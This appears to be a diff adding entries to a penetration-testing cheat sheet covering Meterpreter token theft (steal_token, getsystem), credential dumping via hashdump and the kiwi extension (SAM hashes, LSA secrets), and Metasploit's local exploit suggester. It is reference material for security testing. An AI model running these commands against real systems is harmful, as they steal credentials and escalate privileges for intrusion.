@@ -132,10 +132,12 @@
     - `6.3.1` impacket-GetUserSPNs
     - `6.3.2` Cracking TGS hashes
   - `6.4` **Token Impersonation**
+    - `6.4.1` Steal process token
   - `6.5` **Credential Dumping**
     - `6.5.1` Mimikatz
     - `6.5.2` LSASS dump (Task Manager)
     - `6.5.3` LSASS dump (procdump)
+    - `6.5.4` Meterpreter hashdump / kiwi
   - `6.6` **GPP / cPassword Attacks**
 - `7` **Persistence & Domain Dominance**
   - `7.1` **User and Group Manipulation**
@@ -145,6 +147,7 @@
   - `8.1` **Automated Enumeration**
     - `8.1.1` LinPEAS
     - `8.1.2` WinPEAS
+    - `8.1.3` Metasploit local_exploit_suggester
   - `8.2` **Linux — Manual Checks**
     - `8.2.1` Kernel version & exploits
     - `8.2.2` Sudo privileges
@@ -158,6 +161,7 @@
     - `8.2.10` Exposed debuggers / Node.js `--inspect` ports
     - `8.2.11` UNIX socket file-descriptor passing (SCM_RIGHTS)
   - `8.3` **Privesc Resources**
+  - `8.4` **Windows — Token Escalation (Meterpreter)**
 - `9` **Useful Resources**
 
 ## 1. Host Discovery
@@ -3563,6 +3567,43 @@ impersonate_token DOMAIN\\USERNAME
 
 </details>
 
+#### 6.4.1 Steal process token
+
+**Enumerate running processes and their owners:**
+
+```
+ps
+```
+
+**Steal the token of a specific process:**
+
+```
+steal_token <PID>
+```
+
+**Verify the impersonated identity:**
+
+```
+getuid
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `steal_token <PID>` adopts the security token of a running process (e.g. a service such as `wmiprvse.exe` or `svchost.exe` running as `NT AUTHORITY\SYSTEM` or another user).
+- Unlike incognito's `impersonate_token` (which adopts tokens enumerated from cached logon sessions), `steal_token` grabs the token directly from a specific process you can open — it does not require the incognito extension.
+- Requires sufficient rights to open the target process (admin / SYSTEM, or SeDebugPrivilege).
+
+**Commands**
+
+- `ps` — Lists processes with PIDs, owning users, and paths.
+- `steal_token <PID>` — Impersonates the token of the specified process.
+- `getuid` — Confirms the current (stolen) identity.
+
+</details>
+
 ### 6.5 Credential Dumping
 
 #### 6.5.1 Mimikatz
@@ -3649,6 +3690,38 @@ procdump.exe -accepteula -ma <PID> <DUMP_FILE>
 - `-ma` — Writes a full memory dump.
 - `<PID>` — Process ID of lsass.exe.
 - `<DUMP_FILE>` — Destination filename for the memory dump.
+
+</details>
+
+#### 6.5.4 Meterpreter hashdump / kiwi
+
+**Dump local SAM hashes (Meterpreter):**
+
+```
+hashdump
+```
+
+**Dump SAM and LSA secrets via the kiwi extension (Mimikatz wrapper):**
+
+```
+load kiwi
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `hashdump` dumps all local SAM user hashes (LM + NTLM) and requires SYSTEM or admin privileges.
+- `lsa_dump_sam` and `lsa_dump_secrets` are provided by the **kiwi** extension, the Meterpreter wrapper around Mimikatz — see [6.5.1](#651-mimikatz).
+- `lsa_dump_secrets` exposes LSA secrets such as `DPAPI_SYSTEM`, service account passwords, and machine keys.
+
+**Troubleshooting**
+
+- `hashdump` returning `priv_passwd_get_sam_hashes: Operation failed: Incorrect function` is common on newer Windows or when the session runs as x86 (WOW64). Fixes:
+  - `getsystem` (when admin) or `migrate` into a native x64 process (e.g. `svchost.exe`).
 
 </details>
 
@@ -3818,6 +3891,32 @@ dir \\<MACHINE_NAME>\c$
 - Same colour-coding convention as LinPEAS.
 
 **Reference:** [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)
+
+</details>
+
+#### 8.1.3 Metasploit local_exploit_suggester
+
+**Background the Meterpreter session and run the suggester:**
+
+```
+meterpreter > bg
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION <SESSION_ID>
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Runs a battery of local exploit checks against the compromised session and reports which kernels/services look vulnerable.
+- Only a recon/filter step — candidates still need to be executed manually (`use exploit/windows/local/<NAME>`, `set SESSION`, `set LHOST`, `run`).
+- Pairs well with a low-privilege session: run it, pick a matching exploit (e.g. `ms15_051_client_copy_image`), and escalate to SYSTEM.
+
+**Parameters**
+
+- `SESSION` — The backgrounded Meterpreter session number to run the checks on.
 
 </details>
 
@@ -4135,6 +4234,37 @@ for level, ctype, cdata in ancdata:
 | [GTFOBins](https://gtfobins.github.io/) | Exploitable sudo/SUID/SGID binaries on Linux |
 | [LOLBAS](https://lolbas-project.github.io/) | Living-off-the-land binaries on Windows |
 | [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Comprehensive privesc techniques for both OSes |
+
+### 8.4 Windows — Token Escalation (Meterpreter)
+
+**Escalate an admin session to SYSTEM:**
+
+```
+getsystem
+```
+
+**Verify the resulting identity:**
+
+```
+getuid
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- `getsystem` automatically escalates an admin-level Meterpreter session to `NT AUTHORITY\SYSTEM`.
+- Not a kernel exploit — it abuses Windows service/pipe/token mechanisms, so it generally requires prior admin rights.
+- If it fails, fall back to `migrate` into a SYSTEM-owned process or a local exploit (see [8.1.3](#813-metasploit-local_exploit_suggester)).
+- Related: token impersonation (`6.4`) and `steal_token` from a running process (`6.4.1`).
+
+**Commands**
+
+- `getsystem` — Escalates the session to SYSTEM.
+- `getuid` — Confirms the current identity.
+
+</details>
 
 ## 9. Useful Resources
 
